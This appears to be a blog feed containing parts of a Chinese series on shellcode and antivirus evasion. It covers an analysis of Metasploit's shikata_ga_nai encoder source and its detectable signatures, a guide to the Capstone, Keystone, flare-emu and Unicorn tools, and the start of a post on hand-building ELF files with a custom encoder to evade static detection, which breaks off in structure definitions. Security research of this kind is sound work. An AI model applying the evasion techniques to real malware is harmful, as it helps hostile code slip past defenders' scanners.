<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">count_reg = Rex::Poly::LogicalRegister::X86.new(<span class="string">'count'</span>, <span class="string">'ecx'</span>)</span><br><span class="line">addr_reg  = Rex::Poly::LogicalRegister::X86.new(<span class="string">'addr'</span>)</span><br><span class="line">key_reg = <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> state.context_encoding</span><br><span class="line">  key_reg = Rex::Poly::LogicalRegister::X86.new(<span class="string">'key'</span>, <span class="string">'eax'</span>)</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  key_reg = Rex::Poly::LogicalRegister::X86.new(<span class="string">'key'</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Declare individual blocks</span></span><br><span class="line">endb = Rex::Poly::SymbolicBlock::End.new</span><br><span class="line"></span><br><span class="line"><span class="comment"># Clear the counter register</span></span><br><span class="line">clear_register = Rex::Poly::LogicalBlock.new(<span class="string">'clear_register'</span>,</span><br><span class="line">  <span class="string">"\x31\xc9"</span>,  <span class="comment"># xor ecx,ecx</span></span><br><span class="line">  <span class="string">"\x29\xc9"</span>,  <span class="comment"># sub ecx,ecx</span></span><br><span class="line">  <span class="string">"\x33\xc9"</span>,  <span class="comment"># xor ecx,ecx</span></span><br><span class="line">  <span class="string">"\x2b\xc9"</span>)  <span class="comment"># sub ecx,ecx</span></span><br></pre></td></tr></table></figure>

<p><code>ecx</code> 中存储是接下来要进行解密的长度，所以需要先清空 <code>ecx</code>,清空的指令是从这几条指令中任选一条。</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (length &lt;= <span class="number">255</span>)</span><br><span class="line">  init_counter.add_perm(<span class="string">"\xb1"</span> + [ length ].pack(<span class="string">'C'</span>))</span><br><span class="line"><span class="keyword">elsif</span> (length &lt;= <span class="number">65536</span>)</span><br><span class="line">  init_counter.add_perm(<span class="string">"\x66\xb9"</span> + [ length ].pack(<span class="string">'v'</span>))</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  init_counter.add_perm(<span class="string">"\xb9"</span> + [ length ].pack(<span class="string">'V'</span>))</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Key initialization block</span></span><br><span class="line">init_key = <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If using context encoding, we use a mov reg, [addr]</span></span><br><span class="line"><span class="keyword">if</span> state.context_encoding</span><br><span class="line">  init_key = Rex::Poly::LogicalBlock.new(<span class="string">'init_key'</span>,</span><br><span class="line">    Proc.new &#123; <span class="params">|b|</span> (<span class="number">0xa1</span> + b.regnum_of(key_reg)).chr + <span class="string">'XORK'</span>&#125;)</span><br><span class="line"><span class="comment"># Otherwise, we do a direct mov reg, val</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  init_key = Rex::Poly::LogicalBlock.new(<span class="string">'init_key'</span>,</span><br><span class="line">    Proc.new &#123; <span class="params">|b|</span> (<span class="number">0xb8</span> + b.regnum_of(key_reg)).chr + <span class="string">'XORK'</span>&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">xor  = Proc.new &#123; <span class="params">|b|</span> <span class="string">"\x31"</span> + (<span class="number">0x40</span> + b.regnum_of(addr_reg) + (<span class="number">8</span> * b.regnum_of(key_reg))).chr &#125;</span><br><span class="line">add  = Proc.new &#123; <span class="params">|b|</span> <span class="string">"\x03"</span> + (<span class="number">0x40</span> + b.regnum_of(addr_reg) + (<span class="number">8</span> * b.regnum_of(key_reg))).chr &#125;</span><br><span class="line"></span><br><span class="line">sub4 = Proc.new &#123; <span class="params">|b|</span> sub_immediate(b.regnum_of(addr_reg), -<span class="number">4</span>) &#125;</span><br><span class="line">add4 = Proc.new &#123; <span class="params">|b|</span> add_immediate(b.regnum_of(addr_reg), <span class="number">4</span>) &#125;</span><br></pre></td></tr></table></figure>

<p>计算偏移，生成如下四条指令:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOAD:08048062 B1 1F                                   mov     cl, 1Fh</span><br><span class="line">LOAD:08048064 31 7D 1A                                xor     [ebp+1Ah], edi</span><br><span class="line">LOAD:08048067 83 ED FC                                sub     ebp, 0FFFFFFFCh</span><br><span class="line">LOAD:0804806A 03 7D 16                                add     edi, [ebp+16h]</span><br></pre></td></tr></table></figure>

<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fpu = Rex::Poly::LogicalBlock.new(<span class="string">'fpu'</span>,</span><br><span class="line">*fpu_instructions)</span><br><span class="line"></span><br><span class="line">fnstenv = Rex::Poly::LogicalBlock.new(<span class="string">'fnstenv'</span>,</span><br><span class="line"><span class="string">"\xd9\x74\x24\xf4"</span>)</span><br><span class="line">fnstenv.depends_on(fpu)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get EIP off the stack</span></span><br><span class="line">getpc = Rex::Poly::LogicalBlock.new(<span class="string">'getpc'</span>,</span><br><span class="line">Proc.new &#123; <span class="params">|b|</span> (<span class="number">0x58</span> + b.regnum_of(addr_reg)).chr &#125;)</span><br><span class="line">getpc.depends_on(fnstenv)</span><br></pre></td></tr></table></figure>

<p>生成 <code>fpu</code> 操作指令和 <code>fnstenv</code> 指令，来getpc。</p>
<p>可以看到 <code>\xd9\x74\x24\xf4</code> 是一个硬编码，这就是一个特征。同时<code>fpu</code> 指令也是有限的：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fpu_instructions</span></span></span><br><span class="line">  puts <span class="string">"-----sub_immediate : fpu_instructions----------------"</span></span><br><span class="line">  fpus = []</span><br><span class="line"></span><br><span class="line">  <span class="number">0xe8</span>.upto(<span class="number">0xee</span>) &#123; <span class="params">|x|</span> fpus &lt;&lt; <span class="string">"\xd9"</span> + x.chr &#125;</span><br><span class="line">  <span class="number">0xc0</span>.upto(<span class="number">0xcf</span>) &#123; <span class="params">|x|</span> fpus &lt;&lt; <span class="string">"\xd9"</span> + x.chr &#125;</span><br><span class="line">  <span class="number">0xc0</span>.upto(<span class="number">0xdf</span>) &#123; <span class="params">|x|</span> fpus &lt;&lt; <span class="string">"\xda"</span> + x.chr &#125;</span><br><span class="line">  <span class="number">0xc0</span>.upto(<span class="number">0xdf</span>) &#123; <span class="params">|x|</span> fpus &lt;&lt; <span class="string">"\xdb"</span> + x.chr &#125;</span><br><span class="line">  <span class="number">0xc0</span>.upto(<span class="number">0xc7</span>) &#123; <span class="params">|x|</span> fpus &lt;&lt; <span class="string">"\xdd"</span> + x.chr &#125;</span><br><span class="line"></span><br><span class="line">  fpus &lt;&lt; <span class="string">"\xd9\xd0"</span></span><br><span class="line">  fpus &lt;&lt; <span class="string">"\xd9\xe1"</span></span><br><span class="line">  fpus &lt;&lt; <span class="string">"\xd9\xf6"</span></span><br><span class="line">  fpus &lt;&lt; <span class="string">"\xd9\xf7"</span></span><br><span class="line">  fpus &lt;&lt; <span class="string">"\xd9\xe5"</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># This FPU instruction seems to fail consistently on Linux</span></span><br><span class="line">  <span class="comment">#fpus &lt;&lt; "\xdb\xe1"</span></span><br><span class="line"></span><br><span class="line">  fpus</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>所有可能的指令选择都在 <code>fpus</code> 这个数组中了。剩下的部分就不再说了。</p>
<h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p>经过上述的分析，可以发现 <code>x86/shikata_ga_nai</code> 编码器的特征也是比较固定的，所以针对这个特征写出专有的静态查杀规则也是比较简单的。本文就不再写了，有兴趣的自己写一个把。</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>杀软的无奈</tag>
      </tags>
  </entry>
  <entry>
    <title>杀软的无奈-基础工具篇(一)</title>
    <url>/2020/12/13/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88-%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7%E7%AF%87(%E4%B8%80)/</url>
    <content><![CDATA[<blockquote>
<p>本文首发于安全客: <a href="https://www.anquanke.com/post/id/242548" target="_blank" rel="noopener">https://www.anquanke.com/post/id/242548</a></p>
</blockquote>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>杀软的无奈是我准备开始写的一个新的专题文章，主要用来分享恶意代码分析过程用到的一些方法和工具，以及shellcode编写,shellcode分析，metasploit中的shellcode编码器的实现，编码器特征码定位，编码shellcode绕过杀软检测，基于unicorn检测shellcode编码器等相关的知识。文章中讲的案例会主要集中在linux平台中的ELF文件，但是由于个人的精力和知识水平有限，文章更新的频率和质量不太敢保证。如果有地方写的不太对，希望大佬们能够积极斧正，给与一些指导和帮助。</p>
<a id="more"></a>

<p>这是这个系列的第一篇文章，俗话说万丈高楼平地起，我们第一篇主要说一下我觉得非常实用的工具，在之后的文章中我的脚本会基于这些工具开发，并不会再介绍这些基础工具的使用。</p>
<h2 id="相关工具的简介"><a href="#相关工具的简介" class="headerlink" title="相关工具的简介"></a>相关工具的简介</h2><ul>
<li>Capstone, 全能的反编译框架</li>
<li>Keystone, 全能的编译框架</li>
<li>IDAPython, 给ida神器再插上翅膀</li>
<li>unicorn, 基于qemu的模拟执行框架(unicorn官方版本不支持SMC，我patch了一下相关代码<a href="https://github.com/wonderkun/unicorn,建议安装这个版本" target="_blank" rel="noopener">https://github.com/wonderkun/unicorn,建议安装这个版本</a>)</li>
<li>flare-emu, 基于unicorn的ida插件，能够快速帮你获取你不想读的代码的执行结果。</li>
</ul>
<h2 id="全能反汇编引擎-Capstone"><a href="#全能反汇编引擎-Capstone" class="headerlink" title="全能反汇编引擎 Capstone"></a>全能反汇编引擎 Capstone</h2><p>Capstone是一个非常优秀的反汇编框架，支持多种CPU架构的，而且提供多种语言的api接口，使用起来非常的简单方便，IDA，Radare2，Qemu等著名项目都使用了Capstone Engine。</p>
<p>源码地址:<a href="https://github.com/aquynh/capstone.git" target="_blank" rel="noopener">https://github.com/aquynh/capstone.git</a>,官方文档: <a href="http://www.capstone-engine.org/lang_python.html" target="_blank" rel="noopener">http://www.capstone-engine.org/lang_python.html</a></p>
<p>一个简单的例子如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">CODE = <span class="string">b"\x55\x48\x8b\x05\xb8\x13\x00\x00"</span></span><br><span class="line"></span><br><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(CODE, <span class="number">0x1000</span>):</span><br><span class="line">    print(<span class="string">"%d\t0x%x:\t%s\t%s\t%s"</span> %(i.id,i.address, i.mnemonic, i.op_str,i.bytes.hex()))</span><br></pre></td></tr></table></figure>
<p>初始化一个Cs类，需要有两个参数，分别是平台和架构模式<br><img src="https://pic.wonderkun.cc/uploads/2021/03/16079165032315.jpg" alt=""></p>
<p><code>md.disasm</code> 函数需要提供两个参数，第一个参数是需要分析的bytes，第二个参数是基地址。返回一个生成器，遍历就可以得到每条指令的对象 CsInsn，它导出了与此条指令相关的很多属性，详细的解释如下：<br><img src="https://pic.wonderkun.cc/uploads/2021/03/16079168097121.jpg" alt=""></p>
<h2 id="全能的编译引擎-Keystone"><a href="#全能的编译引擎-Keystone" class="headerlink" title="全能的编译引擎 Keystone"></a>全能的编译引擎 Keystone</h2><p>与Capstone相对应的，那必然是keystone了，keystone与capstone功能恰好恰好相反，是一个全能的支持多种架构的编译框架。源代码地址<a href="https://github.com/keystone-engine/keystone" target="_blank" rel="noopener">https://github.com/keystone-engine/keystone</a>,官方文档地址<a href="https://www.keystone-engine.org/docs/tutorial.html" target="_blank" rel="noopener">https://www.keystone-engine.org/docs/tutorial.html</a>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">CODE = <span class="string">b"INC ecx; DEC edx"</span> <span class="comment"># separate assembly instructions by ; or \n</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># Initialize engine in X86-32bit mode</span></span><br><span class="line">    ks = Ks(KS_ARCH_X86, KS_MODE_32)</span><br><span class="line">    encoding, count = ks.asm(CODE)</span><br><span class="line">    print(<span class="string">"%s = %s (number of statements: %u)"</span> %(CODE, encoding, count))</span><br><span class="line"><span class="keyword">except</span> KsError <span class="keyword">as</span> e:</span><br><span class="line">    print(<span class="string">"ERROR: %s"</span> %e)</span><br></pre></td></tr></table></figure>
<p>可以看到，跟Capstone的使用方法非常类似。</p>
<h2 id="IDAPython"><a href="#IDAPython" class="headerlink" title="IDAPython"></a>IDAPython</h2><p>ida是逆向分析的神器，但是再加上idapython那就是给神器安装上翅膀，非常好用，关于idapython的api使用说明，可以读一下我的学习记录<a href=""></a>，里面有比较好的学习资料推荐。</p>
<h2 id="flare-emu"><a href="#flare-emu" class="headerlink" title="flare-emu"></a>flare-emu</h2><p>是fireEye开源的一款基于unicorn，并且直接可以再ida导入使用的代码模拟执行工具，这个工具对于我们利用ida分析恶意代码或者shellcode都非常的有用，特别是复杂的加密算法，或者是恶心的自解密代码。<br>关于这款工具的使用说明可以参考这篇翻译文章<a href="https://wonderkun.cc/2020/03/02/%E7%94%A8%E6%A8%A1%E6%8B%9F%E6%89%A7%E8%A1%8C%E5%AE%9E%E7%8E%B0Objective-C%E4%BB%A3%E7%A0%81%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://wonderkun.cc/2020/03/02/%E7%94%A8%E6%A8%A1%E6%8B%9F%E6%89%A7%E8%A1%8C%E5%AE%9E%E7%8E%B0Objective-C%E4%BB%A3%E7%A0%81%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%86%E6%9E%90/</a><br>,或者直接看源代码 <a href="https://github.com/fireeye/flare-emu" target="_blank" rel="noopener">https://github.com/fireeye/flare-emu</a>，我当时修改了一个python3的版本用于支持ida7.4，<br>详情见我的github<a href="https://github.com/wonderkun/flare-emu" target="_blank" rel="noopener">https://github.com/wonderkun/flare-emu</a>。</p>
<p><strong>注意</strong>: 在mac平台上，ida默认使用的python并不是是用brew安装的python3，需要手工切换一下，切换方法可以参考<a href="https://github.com/wonderkun/flare-emu#intall-on-mac" target="_blank" rel="noopener">https://github.com/wonderkun/flare-emu#intall-on-mac</a>。<br>pip安装的unicorn可能不支持python3，需要自己编译安装一下unicorn。</p>
<h2 id="unicorn"><a href="#unicorn" class="headerlink" title="unicorn"></a>unicorn</h2><p>Unicorn 是一款基于qemu模拟器的模拟执行框架，支持Arm, Arm64 (Armv8), M68K, Mips, Sparc, &amp; X86 (include X86_64)等指令集，为多种语言提供编程接口比如C/C++、Python、Java 等语言。Unicorn的DLL 可以被更多的语言调用，比如易语言、Delphi，前途无量。它的设计之初就考虑到线程安全问题，能够同时并发模拟执行代码，极大的提高了实用性。</p>
<p><strong>在后续分析shellcode的过程中，会遇到大量的 self-modify-code，unicorn官方提供的版本是不支持SMC代码的，<a href="https://github.com/unicorn-engine/unicorn/issues/820,所以我参照网上的方法patch了一个版本https://github.com/wonderkun/unicorn,建议安装这个版本。就目前来看是够用的，但是官方还没有接受我的pr，具体原因未知。" target="_blank" rel="noopener">https://github.com/unicorn-engine/unicorn/issues/820,所以我参照网上的方法patch了一个版本https://github.com/wonderkun/unicorn,建议安装这个版本。就目前来看是够用的，但是官方还没有接受我的pr，具体原因未知。</a></strong></p>
<h3 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h3><p>Unicorn 采用虚拟内存机制，使得虚拟CPU的内存与真实CPU的内存隔离。Unicorn 使用如下API来操作内存:</p>
<ul>
<li>mem_map</li>
<li>mem_read</li>
<li>mem_write<br>使用uc_mem_map映射内存的时候，address 与 size 都需要与0x1000对齐，也就是0x1000的整数倍，否则会报UC_ERR_ARG 异常。如何动态分配管理内存并实现libc中的malloc功能将在后面的课程中讲解。<h3 id="Hook机制"><a href="#Hook机制" class="headerlink" title="Hook机制"></a>Hook机制</h3>Unicorn的Hook机制为编程控制虚拟CPU提供了便利。<br>Unicorn 支持多种不同类型的Hook。<br>大致可以分为(hook_add第一参数，Unicorn常量)：</li>
<li>指令执行类<ul>
<li>UC_HOOK_INTR</li>
<li>UC_HOOK_INSN</li>
<li>UC_HOOK_CODE</li>
<li>UC_HOOK_BLOCK</li>
</ul>
</li>
<li>内存访问类<ul>
<li>UC_HOOK_MEM_READ</li>
<li>UC_HOOK_MEM_WRITE</li>
<li>UC_HOOK_MEM_FETCH</li>
<li>UC_HOOK_MEM_READ_AFTER</li>
<li>UC_HOOK_MEM_PROT</li>
<li>UC_HOOK_MEM_FETCH_INVALID</li>
<li>UC_HOOK_MEM_INVALID</li>
<li>UC_HOOK_MEM_VALID</li>
</ul>
</li>
<li>异常处理类<ul>
<li>UC_HOOK_MEM_READ_UNMAPPED</li>
<li>UC_HOOK_MEM_WRITE_UNMAPPED</li>
<li>UC_HOOK_MEM_FETCH_UNMAPPED<br>调用hook_add函数可添加一个Hook。Unicorn的Hook是链式的，而不是传统Hook的覆盖式，也就是说，可以同时添加多个同类型的Hook，Unicorn会依次调用每一个handler。hook callback 是有作用范围的（见hook_add begin参数）。<br>python包中的hook_add函数原型如下<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_add</span><span class="params">(self, htype, callback, user_data=None, begin=<span class="number">1</span>, end=<span class="number">0</span>, arg1=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>htype 就是Hook的类型，callback是hook回调用；</li>
<li>callback 是Hook的处理handler指针。请注意！不同类型的hook，handler的参数定义也是不同的。</li>
<li>user_data 附加参数，所有的handler都有一个user_data参数，由这里传值。</li>
<li>begin hook 作用范围起始地址</li>
<li>end hook 作用范围结束地址，默认则作用于所有代码。</li>
</ul>
<h3 id="hookcall"><a href="#hookcall" class="headerlink" title="hookcall"></a>hookcall</h3><p>不同类型的hook，对应的callback的参数也是不相同的，这里只给出C语言定义。<br>Python 编写callback的时候参考C语言即可（看参数）。</p>
<h4 id="UC-HOOK-CODE-amp-UC-HOOK-BLOCK-的callback定义"><a href="#UC-HOOK-CODE-amp-UC-HOOK-BLOCK-的callback定义" class="headerlink" title="UC_HOOK_CODE &amp; UC_HOOK_BLOCK 的callback定义"></a>UC_HOOK_CODE &amp; UC_HOOK_BLOCK 的callback定义</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*<span class="keyword">uc_cb_hookcode_t</span>)</span><span class="params">(uc_engine *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">uint32_t</span> <span class="built_in">size</span>, <span class="keyword">void</span> *user_data)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>address: 当前执行的指令地址</li>
<li>size: 当前指令的长度，如果长度未知，则为0</li>
<li>user_data: hook_add 设置的user_data参数</li>
</ul>
<h4 id="READ-WRITE-amp-FETCH-的-callback-定义"><a href="#READ-WRITE-amp-FETCH-的-callback-定义" class="headerlink" title="READ, WRITE &amp; FETCH 的 callback 定义"></a>READ, WRITE &amp; FETCH 的 callback 定义</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*<span class="keyword">uc_cb_hookmem_t</span>)</span><span class="params">(uc_engine *uc, uc_mem_type type,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">uint64_t</span> address, <span class="keyword">int</span> <span class="built_in">size</span>, <span class="keyword">int64_t</span> value, <span class="keyword">void</span> *user_data)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>type: 内存操作类型 READ, or WRITE</li>
<li>address: 当前指令地址</li>
<li>size: 读或写的长度</li>
<li>value: 写入的值（type = read时无视）</li>
<li>user_data: hook_add 设置的user_data参数</li>
</ul>
<h4 id="invalid-memory-access-events-UNMAPPED-and-PROT-events-的-callback-定义"><a href="#invalid-memory-access-events-UNMAPPED-and-PROT-events-的-callback-定义" class="headerlink" title="invalid memory access events (UNMAPPED and PROT events) 的 callback 定义"></a>invalid memory access events (UNMAPPED and PROT events) 的 callback 定义</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">bool</span> <span class="params">(*<span class="keyword">uc_cb_eventmem_t</span>)</span><span class="params">(uc_engine *uc, uc_mem_type type,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">uint64_t</span> address, <span class="keyword">int</span> <span class="built_in">size</span>, <span class="keyword">int64_t</span> value, <span class="keyword">void</span> *user_data)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>type: 内存操作类型 READ, or WRITE</li>
<li>address: 当前指令地址</li>
<li>size: 读或写的长度</li>
<li>value: 写入的值（type = read时无视）</li>
<li>user_data: hook_add 设置的user_data参数<br>  返回值<br>  返回真，继续模拟执行<br>  返回假，停止模拟执行</li>
</ul>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>杀软的无奈</tag>
      </tags>
  </entry>
  <entry>
    <title>杀软的无奈-手工构建免杀的ELF文件(四)</title>
    <url>/2021/05/16/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88-%E6%89%8B%E5%B7%A5%E6%9E%84%E5%BB%BA%E5%85%8D%E6%9D%80%E7%9A%84ELF%E6%96%87%E4%BB%B6(%E5%9B%9B)/</url>
    <content><![CDATA[<blockquote>
<p>本文首发于安全客: <a href="https://www.anquanke.com/post/id/242551" target="_blank" rel="noopener">https://www.anquanke.com/post/id/242551</a></p>
</blockquote>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上一节我们利用模拟执行工具 unicorn 分析了 metasploit 生成的 shellcode 的执行过程和编码器 <code>x86/shikata_ga_nai</code> 的解码逻辑， 并依据 metasploit 的源代码分析了 payload 的生成过程。<br>从生成过程中我们也可以发现编码器的静态特征比较明显，容易被反病毒软件静态识别。为了逃避过杀毒软件的静态查杀，本文主要讲解如何实现自己的编码器进行代码编码并且手工构建ELF文件，因为ruby语言实在的不熟悉，所以本文暂时不会基于metasploit开发，主要还是使用我比较顺手的语言 python 进行开发。</p>
<a id="more"></a>

<h2 id="手工构建ELF文件"><a href="#手工构建ELF文件" class="headerlink" title="手工构建ELF文件"></a>手工构建ELF文件</h2><p>要想手工构建ELF文件，那必然是避免不了操作elf的文件结构。我一直以为python不能像c那样方便的把数据赋值给结构体进行解析，或者将结构体dump为具体的数据，但实则不然。 在一次读文档的时候我发现了 python 竟然可以类似于 C 的方式轻松的解析数据为结构体，dump 结构体的内容为数据。</p>
<p>具体的操作方式看如下的例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes <span class="keyword">as</span> c</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pointer</span><span class="params">(c.Structure)</span>:</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">"x"</span>,c.c_int),</span><br><span class="line">        (<span class="string">"y"</span>,c.c_int),</span><br><span class="line">        (<span class="string">"z"</span>,c.c_int)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将结构体dump字节数据</span></span><br><span class="line">p = Pointer(x=<span class="number">1</span>,y=<span class="number">2</span>,z=<span class="number">3</span>)</span><br><span class="line">t = c.string_at(c.addressof(p),c.sizeof(p))</span><br><span class="line">print( t )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将字节数据转化为结构体</span></span><br><span class="line">bytes_p = <span class="string">b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c"</span></span><br><span class="line">new_p = Pointer()</span><br><span class="line">c.memmove(c.addressof(new_p),bytes_p,c.sizeof(Pointer))</span><br><span class="line"><span class="comment"># print(t)</span></span><br><span class="line">print(<span class="string">"recover Point:"</span>,hex(new_p.x),hex(new_p.y),hex(new_p.z))</span><br></pre></td></tr></table></figure>

<p>有了上面的方法，操作结构体就和c语言差别不大了，接下来写代码就非常方便了。</p>
<h3 id="定义文件框架结构"><a href="#定义文件框架结构" class="headerlink" title="定义文件框架结构"></a>定义文件框架结构</h3><p>由于我们是要用shellcode来构架elf文件，所以我们的代码肯定是地址无关的，所以只用构建ELF文件的执行视图即可，不需要构建链接视图。</p>
<p>所以接下来的代码比较简单，我就不再详细赘述了，直接贴上来吧：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes <span class="keyword">as</span> c</span><br><span class="line"><span class="keyword">import</span> keystone <span class="keyword">as</span> k</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ARCH = "x86"</span></span><br><span class="line">ARCH = <span class="string">"x86_64"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ARCH == <span class="string">"x86"</span>:</span><br><span class="line">    ElfN_Addr = c.c_uint</span><br><span class="line">    ElfN_Off = c.c_uint</span><br><span class="line">    ElfN_Word = c.c_uint</span><br><span class="line">    ElfN_SWord = c.c_uint</span><br><span class="line">    ElfN_Half = c.c_ushort</span><br><span class="line">    EI_CLASS = <span class="number">0x1</span></span><br><span class="line">    e_machine = <span class="number">0x3</span></span><br><span class="line">    MEM_VADDR = <span class="number">0x08048000</span></span><br><span class="line">    FILENAME = <span class="string">"test_x86.elf"</span></span><br><span class="line">    MODE = k.KS_MODE_32</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ElfN_Addr = c.c_ulonglong</span><br><span class="line">    ElfN_Off = c.c_ulonglong</span><br><span class="line">    ElfN_Word = c.c_uint</span><br><span class="line">    ElfN_SWord = c.c_int</span><br><span class="line">    ElfN_Half = c.c_ushort</span><br><span class="line">    EI_CLASS = <span class="number">0x2</span></span><br><span class="line">    e_machine = <span class="number">0x3E</span></span><br><span class="line">    MEM_VADDR = <span class="number">0x400000</span></span><br><span class="line">    FILENAME = <span class="string">"test_x86_64.elf"</span></span><br><span class="line">    MODE = k.KS_MODE_64</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://man7.org/linux/man-pages/man5/elf.5.html</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ElfN_Ehdr</span><span class="params">(c.Structure)</span>:</span></span><br><span class="line">    <span class="comment"># 定义elf文件头</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">        typedef struct &#123;</span></span><br><span class="line"><span class="string">            unsigned char e_ident[EI_NIDENT];</span></span><br><span class="line"><span class="string">            uint16_t      e_type;</span></span><br><span class="line"><span class="string">            uint16_t      e_machine;</span></span><br><span class="line"><span class="string">            uint32_t      e_version;</span></span><br><span class="line"><span class="string">            ElfN_Addr     e_entry;</span></span><br><span class="line"><span class="string">            ElfN_Off      e_phoff;</span></span><br><span class="line"><span class="string">            ElfN_Off      e_shoff;</span></span><br><span class="line"><span class="string">            uint32_t      e_flags;</span></span><br><span class="line"><span class="string">            uint16_t      e_ehsize;</span></span><br><span class="line"><span class="string">            uint16_t      e_phentsize;</span></span><br><span class="line"><span class="string">            uint16_t      e_phnum;</span></span><br><span class="line"><span class="string">            uint16_t      e_shentsize;</span></span><br><span class="line"><span class="string">            uint16_t      e_shnum;</span></span><br><span class="line"><span class="string">            uint16_t      e_shstrndx;</span></span><br><span class="line"><span class="string">        &#125; ElfN_Ehdr;</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    EI_NIDENT = <span class="number">16</span></span><br><span class="line">    _pack_ = <span class="number">1</span> </span><br><span class="line">    <span class="comment"># print("[*] : &#123;&#125;".format(c.sizeof(ElfN_Addr)))</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">"e_ident"</span>,c.c_ubyte*EI_NIDENT),</span><br><span class="line">        (<span class="string">"e_type"</span>,ElfN_Half),</span><br><span class="line">        (<span class="string">"e_machine"</span>,ElfN_Half),</span><br><span class="line">        (<span class="string">"e_version"</span>,ElfN_Word),</span><br><span class="line">        (<span class="string">"e_entry"</span>,ElfN_Addr),</span><br><span class="line">        (<span class="string">"e_phoff"</span>,ElfN_Off),</span><br><span class="line">        (<span class="string">"e_shoff"</span>,ElfN_Off),</span><br><span class="line">        (<span class="string">"e_flags"</span>,ElfN_Word),</span><br><span class="line">        (<span class="string">"e_ehsize"</span>,ElfN_Half),</span><br><span class="line">        (<span class="string">"e_phentsize"</span>,ElfN_Half),</span><br><span class="line">        (<span class="string">"e_phnum"</span>,ElfN_Half),</span><br><span class="line">        (<span class="string">"e_shentsize"</span>,ElfN_Half),</span><br><span class="line">        (<span class="string">"e_shnum"</span>,ElfN_Half),</span><br><span class="line">        (<span class="string">"e_shstrndx"</span>,ElfN_Half)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Elf32_Phdr</span><span class="params">(c.Structure)</span>:</span></span><br><span class="line">    <span class="comment"># 定义 programe header</span></span><br><span class="line"></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">        typedef struct 